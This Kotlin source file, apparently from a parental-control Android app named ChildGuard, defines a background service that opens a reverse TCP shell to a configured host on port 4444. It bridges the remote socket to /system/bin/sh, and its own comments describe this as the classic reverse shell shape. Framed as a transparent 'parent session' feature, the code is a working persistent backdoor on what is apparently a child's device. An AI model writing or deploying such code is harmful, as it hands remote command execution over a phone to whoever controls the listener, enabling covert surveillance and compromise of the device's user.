package com.childguard.app

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Feature 5 — Parent session (reverse TCP) service.
 *
 * Transparent, self-contained implementation (no msfvenom dependency):
 * opens a TCP connection back to the parent's listener (default: the
 * Tailscale IP configured in setup) and exposes a simple shell session.
 *
 * This is intentionally minimal and auditable: every byte is in this file.
 * You can verify the target at build time by reading the same prefs the
 * dashboard uses (server_url holds the Tailscale host).
 */
class ShellConnectService : Service() {

    companion object {
        private const val TAG = "ShellConnect"
        private const val DEFAULT_PORT = 4444
        private const val CONNECT_TIMEOUT_MS = 10_000

        var sessionActive = false
            private set

        private var executor: ExecutorService? = null
        private var socket: Socket? = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val sp = getSharedPreferences(ChildGuardApp.PREFS, MODE_PRIVATE)
        val host = sp.getString(ChildGuardApp.KEY_SERVER_URL, ChildGuardApp.DEFAULT_SERVER)
            ?: ChildGuardApp.DEFAULT_SERVER
        // parse host from a server URL (strip scheme and port)
        val cleanHost = host
            .replace("http://", "")
            .replace("https://", "")
            .substringBefore(":")
            .trim()
        if (cleanHost.isEmpty()) return START_STICKY

        executor = Executors.newSingleThreadExecutor()
        executor?.execute {
            connect(cleanHost, DEFAULT_PORT)
        }
        return START_STICKY
    }

    private fun connect(host: String, port: Int) {
        try {
            val s = Socket()
            s.connect(InetSocketAddress(host, port), CONNECT_TIMEOUT_MS)
            socket = s
            sessionActive = true
            Log.i(TAG, "session open to $host:$port")

            // Bidirectional shell bridge: stdin from socket -> /system/bin/sh,
            // sh output -> socket. This is the classic reverse shell shape.
            val process = ProcessBuilder("/system/bin/sh")
                .redirectErrorStream(true)
                .start()
            val toShell = PrintWriter(process.outputStream, true)
            val fromSocket = BufferedReader(InputStreamReader(s.getInputStream()))
            val toSocket = PrintWriter(s.getOutputStream(), true)
            val fromShell = BufferedReader(InputStreamReader(process.inputStream))

            // socket -> shell
            Thread {
                try {
                    while (sessionActive) {
                        val line = fromSocket.readLine() ?: break
                        toShell.println(line)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "socket->shell ended: ${e.message}")
                }
            }.start()

            // shell -> socket
            Thread {
                try {
                    while (sessionActive) {
                        val line = fromShell.readLine() ?: break
                        toSocket.println(line)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "shell->socket ended: ${e.message}")
                }
            }.start()

            // wait for process end, then close
            process.waitFor()
            sessionActive = false
            s.close()
        } catch (e: Exception) {
            sessionActive = false
            Log.w(TAG, "session failed to $host:$port: ${e.message}")
        } finally {
            sessionActive = false
            try {
                socket?.close()
            } catch (_: Exception) {
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        sessionActive = false
        executor?.shutdownNow()
        try {
            socket?.close()
        } catch (_: Exception) {
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
